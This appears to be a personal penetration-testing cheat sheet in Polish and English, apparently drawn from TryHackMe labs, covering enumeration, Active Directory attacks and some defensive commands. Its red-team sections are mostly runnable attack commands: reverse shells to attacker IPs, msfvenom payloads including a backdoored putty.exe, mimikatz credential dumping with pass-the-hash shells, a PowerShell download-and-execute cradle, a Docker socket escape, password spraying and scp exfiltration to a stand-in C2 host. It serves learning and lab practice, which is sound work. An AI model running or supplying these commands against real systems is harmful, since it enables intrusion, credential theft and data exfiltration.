# Overall
## awk
Wycinanie interesujacej nas tresci z pliku
```
awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt
```
-F'[][]' — ustawia znaki [ oraz ] jako separatory kolumn.
'{print $2}' — mówi systemowi: "wypisz tylko drugą kolumnę" (czyli to, co znajduje się między pierwszym [, a pierwszym ]).
> users.txt — zapisuje wynik prosto do nowego pliku.
## Nmap
```
nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt ip
```
Ktore share z DC daja RW
```
nmap -p445 --script smb-enum-shares IP
```
## Gobuster
```
gobuster dir -u http://10.113.166.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
```
```
gobuster vhosts -u $4 -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -o vhosts_found.txt
```
## Find
```
sudo find / -name ".env.local" -type f 2>/dev/null
```
Bez rozrozniania wielkosci liter
```
find . -iname "*monkey*"
```
## Git
Sprawdzajka dla zmian w plikach
```
git status
```
Dodanie zmian do "koszyka" (Staging)
```
git add nazwa_folderu/plik.md
```
Zatwierdzenie zmian (Commit)
```
git commit -m "Opis zmian"
```
Wypchnięcie na serwer (Push)
```
git push origin main
```
Zassanie z serwera na lokal
```
git pull origin main
```
## Grep
Extended Regular Expression
\ (Wyjscie ze znaku specjalnego) omija znaki akcji.
| (Alternatywa): Szuka jednego lub drugiego wzorca.
``` 
grep -E "Failed|Accepted" /var/log/auth.log
#(znajdzie próby logowania udane i nieudane).
```

\+ (Jeden lub więcej): Dopasowuje co najmniej jedno wystąpienie poprzedniego znaku.
```
grep -E "log+"
#(znajdzie "log", "logg", "loggg").
```
? (Zero lub jedno): Sprawia, że poprzedni znak jest opcjonalny.
``` 
grep -E "https?"
#(znajdzie zarówno "http", jak i "https").
``` 
{n,m} (Kwantyfikatory): Pozwala określić dokładną liczbę powtórzeń.
```
grep -E "[0-9]{1,3}"
#(szuka od jednej do trzech cyfr).
```
\b oznacza samodzielne słowa, tutaj wymusza, żeby znajdował tylko 3literowe.wielo.3literowe
```
grep -Eo "\b[a-z]{3}\.[a-z0-9]+\.[a-z]{3}\b"
```
Linie after
```
grep -A 5 "cos"
```
LInie before
```
grep -B 5 "cos"
```
Linie okalajace
```
grep -C 5 "cos"
```
## Olevba
Wyciąga makro VBA
```
olevba <nazwapliku>
```
## Volatility
Do wyciągania info z zrzutu pamięci RAM
```
vol -f memorydump.raw -h # wyprintuje liste dostepnych modulow
```
## xxd
### Podstawowy podgląd
```
xxd plik.bin
# Wyświetla: Offset | Hex | ASCII
```
### Magic Bytes (Identyfikacja typu pliku)
```
xxd -l 16 plik.bin
# -l [długość]: Wypisuje tylko określoną liczbę bajtów. Pozwala sprawdzić nagłówek (np. ELF, PNG).
```
### Konwersja na czysty Hex (Plain)
```
xxd -p plik.txt
# Wypisuje tylko wartości hex, bez offsetów i ASCII. Przydatne do skryptów.
```
### Zmiana formatowania kolumn
```
xxd -c 8 plik.bin
#-c [liczba]: Określa, ile bajtów ma być w jednej linii (domyślnie 16). Pomaga dopasować widok.
```
### Reverse - odzyskiwanie pliku ze zrzutu
```
xxd -r zrzut_hex.txt > plik_wynikowy.bin
#Zamienia tekstowy zapis hex z powrotem na plik binarny.
```
### Eksport do tablicy C
```
xxd -i plik.bin
#Formatuje zawartość jako zmienną typu char[] (idealne do wrzucania shellcode do exploita).
```
## HashExtender
### https://github.com/iagox86/hash_extender
Jeżeli znamy hash końcowy pliku 1.png, możemy dodać do jego nazwy dodatkowy ciąg znaków, nie zmieniając oryginalnego hasha <signature>
### --data: Specifies the original data to be signed ("1.png").
### --signature: Supplies the original hash signature for "1.png".
### --append: Adds the new data to be appended ("/../4.png").
### --out-data-format=html: Formats the output in HTML to mimic a modified web request.
### --format md5 do zmiany formatu
```
./hash_extender --data 1.png --signature 02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9 --append /../4.png --out-data-format=html #SHA256
```
## Notatki
### Detection 1: A Spike of Discovery Commands
```
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel
```
### Detection 2: A Download to Temp Directory
```
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit
```
### Detection 3: Data Exfiltration With SCP
```
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```
# Red
## SHarphound BLoodhound
### bloodhound.py
Sharphound data collector meant for linux
```
bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns 10.211.12.10 -c All --zip
```
### Bloodhound
GRAPH!! Host it
https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
```
sudo neo4j start
sudo neo4j stop
```
http://localhost:7474  
Login, default user neo4j  
```
bloodhound
```
## CrackMapExec
CrackMapExec is a well-known network service exploitation tool that we will use throughout this module. It allows us to perform enumeration, command execution, and post-exploitation attacks in Windows environments. It supports various network protocols, such as SMB, LDAP, RDP, and SSH. If anonymous access is permitted, we can retrieve the password policy without credentials with the following command:
```
crackmapexec smb 10.211.11.10 --pass-pol
```
Password Spray Attack
```
crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
```
## impacket
### getnpusers
Impacket provides a flexible Python script (GetNPUsers.py) to enumerate accounts in non-Windows environments. To test for the pre-authentication vulnerability, you must supply a users.txt file containing usernames.
```
impacket-GetNPUsers tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```
This command enumerates usernames listed in users.txt and collects AS-REP hashes for vulnerable accounts, saving them in hashes.txt for offline cracking.
## enum4linux-ng
enum4linux-ng is a tool that automates various enumeration techniques against Windows systems, including user enumeration. SMB+RPC protocol.
```
enum4linux-ng -A ip -oA results/scan
# -A: Performs all available enumeration functions (users, groups, shares, password policy, RID cycling, OS information and NetBIOS information).
# -oA: Writes output to YAML and JSON files.
```
## john
ukochany amacz
```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
## hashcat
-m trza ustawic na odpowiedni szyfr, np tutaj AS-REP do kerberosa
```
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt 
```

## kerbrute
Kerbrute is a popular enumeration tool used to brute-force and enumerate valid Active Directory users by abusing the Kerberos pre-authentication  
Preferably enumare via enum or manually, create user.txt list and check with kerbrute if these accounts are valid, not disabled, honeypots.
```
kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

## ldapsearch
We can test if anonymous LDAP bind is enabled

```
ldapsearch -x -H ldap://ip -s base
# -x: Simple authentication, in our case, anonymous authentication.
# -H: Specifies the LDAP server.
# -s: Limits the query only to the base object and does not search subtrees or children.
```
User information on dc
```
ldapsearch -x -H ldap://ip -b "dc=tryhackme,dc=loc" "(objectClass=person)"
```
## rpcclient
Microsoft Remote Procedure Call (MSRPC) is a protocol that enables a program running on one computer to request services from a program on another computer thru SMB.
```
rpcclient -U "" ip -N
# -U: Used to specify the username, in our case, we are using an empty string for anonymous login.
# -N: Tells RPC not to prompt us for a password
```
If succesful, we can go through its console.  
500 is the Administrator account, 501 is the Guest account and 512-514 are for the following groups:  Domain Admins, Domain users and Domain guests. User accounts typically start from RID 1000 onwards.
```
for i in $(seq 500 2000); do user=$(echo "queryuser $i" | rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"); if [ -n "$user" ]; then echo "[RID: $i] $user"; fi; done
```
## SMBCLIENT
You can use it to list, upload, download, and browse files on a remote SMB server.
```
smbclient -L //TARGET_IP -N # an anonymous login withhout password try
```
Connect
```
smbclient //TARGET_IP/SHARE_NAME -N
```
## smbmap (script)
Reconnaissance tool that enumerates SMB shares across a host. It can be used to display read and write permissions for each share.
```
smbmap -H TARGET_IP
```
## SQLMAP
Do edycji zmienne jak nazwa submita, pola username i password
```
sqlmap -u "http://10.114.131.93/login.php" --data="pma_username=admin&pma_password=password&submit=Go" --method POST --level 3 --risk 2 --batch --dbs
```
Dla bardziej opornych serwerow
```
sqlmap -u "http://10.114.131.93/index.php" --data="pma_username=admin&pma_password=password&server=1&target=index.php" --method POST --level 3 --risk 2 --batch --dbs
```
# Red team - WINDOWS
# AD
## Privileges
**SeImpersonatePrivilege:** As mentioned already, this privilege allows a process to impersonate the security context of another user after authentication. The “potato” attack revolves around abusing this privilege.  
**SeAssignPrimaryTokenPrivilege:** This privilege permits a process to assign the primary token of another user to a new process. It is used in conjunction with the SeImpersonatePrivilege privilege.  
**SeBackupPrivilege:** This privilege lets users read any file on the system, ignoring file permissions. Consequently, attackers can use it to dump sensitive files like the SAM or SYSTEM hive.  
**SeRestorePrivilege:** This privilege grants the ability to write to any file or registry key without adhering to the set file permissions. Hence, it can be abused to overwrite critical system files or registry settings.  
**SeDebugPrivilege:** This privilege allows the account to attach a debugger to any process. As a result, the attacker can use this privilege to dump memory from LSASS and extract credentials or even inject malicious code into privileged processes.  
```
whoami /all
systeminfo
set
```
## Groups
Domain Admins and Administrators can hold the keys to the whole Active Directory
Enterprise Admins play a key role in a multi-domain forest
Server Operators and Backup Operators are privileged built-in accounts that are worth inspecting
Any group with “Admin” in its name (e.g., “SQL Admins”) could be worth targeting.  
## Registry
After booting, servers and systems are locked until a user manually enters the login credentials. In the case of a misconfigured or testing system, the credentials for auto-logon might be saved.
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```
You might want to check DefaultPassword if saved and AutoAdminLogon if set to 1.
You can search for the value you want using reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v keyword
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
```
For installed apps
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```
To search the registry for a specific keyword. For example, to search the registry for password
```
reg query HKLM /f "password" /t REG_SZ /s
```
## Scheduled tasks
You can list/create/run all scheduled tasks using
```
schtasks /query
# /create
# /run
```
Creating Scheduled Tasks Remotely
```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "THMtask1" 
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```
## SharpHound and BLoodHound
SharpHound is the official BloodHound data collector  
SharpHound.exe: This is a Windows executable designed for standard enumeration on domain-joined Windows machines. Due to its versatility and robust functionality, it is currently the recommended method.  
AzureHound.ps1: A PowerShell script focused specifically on Azure Entra ID environments. It enables enumerating cloud-specific configurations and identities seamlessly into hybrid AD scenarios.  
BloodHound.py (Python Collector) - Linux
```
\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
```
```
bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns 10.211.12.10 -c All --zip
```
### Bloodhound graph webapi
https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
**Object information** – summary details of the object, such as name, type, and domain
**Sessions** – active logon sessions associated with the object
**Member of** – AD groups the object belongs to
**Local admin privileges** – machines where the object has local administrator rights
**Execution privileges** – rights such as RDP or equivalent permissions
**Outbound object control** – rights the object has over other objects
**Inbound object control** – rights other objects have over this object
## Lateral Movement
First remember to craft some payload, then You can use showed below methods for running/uploading it remotely.
### psexec
Ports: 445/TCP (SMB)
Required Group Memberships: Administrators
```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```
### Remote Process Creation Using WinRM
Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
Required Group Memberships: Remote Management Users
Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.
```
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```
### Remotely Creating Services Using sc
Ports:
135/TCP, 49152-65535/TCP (DCE/RPC)
445/TCP (RPC over SMB Named Pipes)
139/TCP (RPC over SMB Named Pipes)
Required Group Memberships: Administrators
Windows services can also be leveraged to run arbitrary commands since they execute a command when started. 
```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```
#### SC payload
Create payload
```
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```
UPload it
```
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```
Run listener
```
msfconsole
use exploit/multi/handler
set LHOST ip
exploit
```
Make another listener on your host
```
nc -lvnp 4443
```
Run sc/better runas on first infected machine
```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```
Run service on new infected machine
```
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```
You have established a connection as new infected user via msfconsole
### WMI & MSI
Ports:
135/TCP, 49152-65535/TCP (DCERPC)
5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
Required Group Memberships: Administrators
MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI
#### Payload
Crafting msi payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.150.74.13 LPORT=4444 -f msi > myinstaller.msi
```
Sending over for ex smb
```
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```
Use multi handler via msfconsole   
Via infected host use powershell and start WMI session
```
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```
Invoke the install method
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```
### NTLM & Kerberos 
#### Extracting NTLM hashes from local SAM
```
mimikatz
privilege::debug
token::elevate
lsadump::sam
```
#### Extracting NTLM hashes from LSASS memory
```
mimikatz
privilege::debug
token::elevate
sekurlsa::msv 
```
#### NTLM Pass the hash attack
Gaining reverse shell
```
mimikatz
token::revert
sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.13 4444"
```
If on linux use rdp, psex, winrm
```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```
```
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```
```
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```
#### Kerberos pass the ticket attack
Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:
```
mimikatz
privilege:debug
sekurlsa::tickets /export
kerberos::
ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```
#### Kerberos Pass the key
This kind of attack is similar to PtH but applied to Kerberos networks.
When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name Pass-the-key (PtK).
```
mimikatz
privilege:debug
sekurlsa::ekeys
```
If RC4 hash:
```
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
If AES128 hash:
```
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
if AES256 hash:
```
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
### Backdooring
If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:
```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```
### RDP hijacking
When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:
```
PsExec64.exe -s cmd.exe
```
o list the existing sessions on a server, you can use the following command:
```
query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM
 ```
According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be rdp-tcp#6. We can also see that a user named luke has left a session open with id 3. Any session with a Disc state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.

To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME. Following the previous example, to takeover luke's session if we were connected as the administrator user, we'd use the following command:
```
tscon 3 /dest:rdp-tcp#6
```
### Port forwarding
Port forwarding techniques, which consist of using any compromised host as a jump box to pivot to other hosts
#### SSH Tunnelling
From infected machine (SSH Client) we have to make connection to our PC (SSH server).  
First create user for that action
```
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
##### SSH Remote Port Forwarding
If the attacker has previously compromised PC-1 and, in turn, PC-1 has access to port 3389 of the server, it can be used to pivot to port 3389 using remote port forwarding from PC-1. Remote port forwarding allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a remote SSH server (the attacker's machine). As a result, a port will be opened in the attacker's machine that can be used to connect back to port 3389 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1.
On PC-1 (SSH-CLient)
```
ssh tunneluser@attackerip -R 3389:serverip:3389 -N
```
Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:
```
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```
##### SSH Local Port FOrwarding
1.1.1.1 - attacker (ssh server), 2.2.2.2 -pc1 (ssh client), 3.3.3.3 server
Local port forwarding allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.
Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn't be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.  

To forward port 80 from the attacker's machine and make it available from PC-1, we can run the following command on PC-1:
```
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```
Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with dir=in). Administrative privileges are needed for this:
```
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```
##### Port Forwarding With socat
1.1.1.1 - attacker (ssh server), 2.2.2.2 -pc1 (ssh client), 3.3.3.3 server  
In situations where SSH is not available, socat can be used to perform similar functionality.
if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:
```
socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```
Note that socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to.
As usual, since a port is being opened on the pivot host, we might need to create a firewall rule to allow any connections to that port:
```
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```
If, on the other hand, we'd like to expose port 80 from the attacker's machine so that it is reachable by the server, we only need to adjust the command a bit:
```
socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```
##### Dynamic Port Forwarding and SOCKS
1.1.1.1 - attacker (ssh server), 2.2.2.2 -pc1 (ssh client), 3.3.3.3 server  
While single port forwarding works quite well for tasks that require access to specific sockets, there are times when we might need to run scans against many ports of a host, or even many ports across many machines, all through a pivot host. In those cases, dynamic port forwarding allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a SOCKS proxy.

Since we don't want to rely on an SSH server existing on the Windows machines in our target network, we will normally use the SSH client to establish a reverse dynamic port forwarding with the following command on PC1:
```
ssh tunneluser@1.1.1.1 -R 9050 -N
```
In this case, the SSH server will start a SOCKS proxy on port 9050, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.

The most interesting part is that we can easily use any of our tools through the SOCKS proxy by using proxychains. To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at /etc/proxychains.conf on your AttackBox.
If we now want to execute any command through the proxy, we can use proxychains:
```
proxychains curl http://pxeboot.za.tryhackme.com
```
## Powershell 
https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps  
**PowerSploit** - powerful tool for enumeration, discovery etc  
https://github.com/PowerShellMafia/PowerSploit  
https://powersploit.readthedocs.io/en/latest/Recon/  
```
Import-Module .\PowerView.ps1
```
Sprawdzenie modulu AD
```
Get-Module -ListAvailable ActiveDirectory
```
Module import
```
Import-Module ActiveDirectory
```
User enumeration
```
Get-ADUser -Filter *
```
User details
```
Get-ADUser -Identity <username> -Properties *
```
Looking for interesting accounts
```
Get-ADUser -Filter "Name -like '*admin*'"
```
Group enumeration
```
Get-ADGroup -Filter *
```
Group members
```
Get-ADGroupMember -Identity "Group Name"
```
Computer enumeration
```
Get-ADComputer -Filter *
```
Default pass policy
```
Get-ADDefaultDomainPasswordPolicy
```
## NET
Domain info
```
net help
```
Listing all domain users
```
net user /domain #bez /domain zlistuje lokalne
```
Info about ex user
```
net user <username> /domain
```
Info about domain groups
```
net group /domain
```
We can discover the names of the computers/users on the domain
```
net group <Group Name> / domain
```
Local groups
```
net localgroup
```
Users of local group
```
net localgroup Administrators
```
Logged on users and sessions
```
query user #alias quser
```
RUnning processes
```
tasklist /V
```
SMB Sessions
```
net session
```
## WMIC
Windows services, including the account for each service
```
wmic service get
wmic service get Name,StartName
```
Occasionally, you might find a service with a domain account, DomainName\username. Such domain accounts are worth investigating as they might be reused elsewhere
For powershell equivalent is
```
Get-WmiObject Win32_Service | select Name, StartName
```
## Rubeus - tylko windows
A powerful Windows-based tool designed explicitly for Kerberos-related security testing and enumeration. Rubeus automatically identifies vulnerable accounts and retrieves encrypted AS-REP hashes.
https://github.com/GhostPack/Rubeus
```
Rubeus.exe asreproast
```
## Notatki
### Encoding
URL-encoding: / => %2f
Hex-encoding: _ => \x5f, 0x5f
Unicode-encoding: % => \u0025
Case Sensitivity (using mixed-cases to avoid detection)
Obfuscation using White Space and Delimiters
'/**/UNION/**/SELECT/**/1,2
<a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>
### Jeśli masz ograniczony shell i nie możesz przesłać pliku, możesz go "wypluć" jako tekst i skopiować:
```
xxd -p tajny_plik.zip > data.hex
# Na maszynie atakującego:
xxd -r -p data.hex > odzyskany_plik.zip
```
### Docker Escape
** 1. Usługa Dockera na hoście jest sterowana przez REST API które komunikuje się za pomocą pliku gniazda unixowego **
```
ls -la /var/run/docker.sock
```
```
docker #sprawdzamy czy mamy zainstalowanego, jak nie to rzezbimy zadanie API recznie
```
Powinno wyświetlić listę wszystkich kontenerów działających na głównej maszynie
```
docker -H unix:///var/run/docker.sock ps
# curl -s -X GET --unix-socket /var/run/docker.sock http://localhost/containers/json wersja z recznym api
```
Sprawdzamy jakie sa obrazy
```
docker -H unix:///var/run/docker.sock images
# curl -s -X GET --unix-socket /var/run/docker.sock http://localhost/containers/json
```
Na podstawie znalezionych obrazow, mozemy w naszym kontenerze zamontowac zewnetrznego hosta
```
docker -H unix:///var/run/docker.sock run -it -v /:/mnt/matka --rm php:8.1-cli chroot /mnt/matka bash
#php:8.1-cli to znaleziony obraz, a wiec otwieramy socketa, montujemy u nas w mnt/matka obraz php i otwieramy sobie basha jako root do niego, a --rm usuwa slady
```
Urzadzenia do mounta
```
lsblk #lub fdisk -l
```
Capabilities roota
```
capsh --print
```
### Reverse Shell
```
nc -e /bin/bash <attackbox_ip> <port>
bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane
python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
```
### Interaktywny shell
https://0xffsec.com/handbook/shells/full-tty/
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
CTRL+Z
```
stty raw -echo && fg
```
### Remote payload execution
```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.thm/shell.ps1')"
```
# Blue
## Ausearch
```
ausearch -i -x socat # Look for suspicious commands
```
```
ausearch -i --pid 27806 # Find its parent process and build a process tree
```
```
ausearch -i --ppid 27808 | grep proctitle # List all its child processes
```
```
ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd
```
## WINDOWS
### Sprawdzenie hash pliku
```
Get-FileHash -Algorithm SHA256 .\file.exe
```
```
certutil -hashfile filename.exe SHA256
```
### Strings Windowsowy
```
Select-String -Path .\file.txt -Pattern "http"
```
```
findstr /i "password" file.txt
```
### Metadata atrybuty
```
Get-Item .\suspicious_file.exe | Select-Object *
```
### Sprawdzenie podpisu
```
Get-AuthenticodeSignature .\installer.exe
```
### Windowsowy grep
```
Select-String
Select-String -Path "C:\Logs\access.log" -Pattern "admin" -CaseSensitive
Get-Process | Select-String "sql" # Sprawdz wszystkie procesy, które mają SQL
```
### Hex
```
Format-Hex .\file.exe | select -first 5
```
### DLL
```
tasklist /m # zrzut wszystkich uzywanych DLL
tasklist /m /fi "IMAGENAME eq notepad.exe" # Sprawdzamy jakie DLL uzywa notepad
tasklist /m /fi "modules eq malicious.dll" # Sprawdzamy w jakich programach jest uzywany dany DLL
```
### CertUtil
#### Dekodowanie b64 pliku
```
certutil -decode
```
#### Encodowanie do b64
```
certutil -encode
```
#### Ściąganie pliku
```
certutil -urlcache -split -f "http://url" C:\Users\Public\payload.exe
```
## Notatki
### Sprawdzenie, czy skrypt nie ukrywa w sobie bajtów wykonywalnych:
```
xxd suspicious_script.sh | head -n 20
```


Przesuń o wyraz do przodu, Alt + F,Forward

Przesuń o wyraz do tyłu, Alt + B,Backward

Przesuń na początek linii, Ctrl + A,A – pierwsza litera alfabetu

Przesuń na koniec linii, Ctrl + E,End 

Usuń wyraz do tyłu, Ctrl + W (lub Alt + Backspace),Word (usuwa słowo w lewo) 

Usuń wyraz do przodu ,Alt + D,Delete (usuwa słowo w prawo) 

Usuń wszystko na lewo, Ctrl + U,Undo (od kursora do początku) 

Usuń wszystko na prawo, Ctrl + K,Kill (od kursora do końca) 

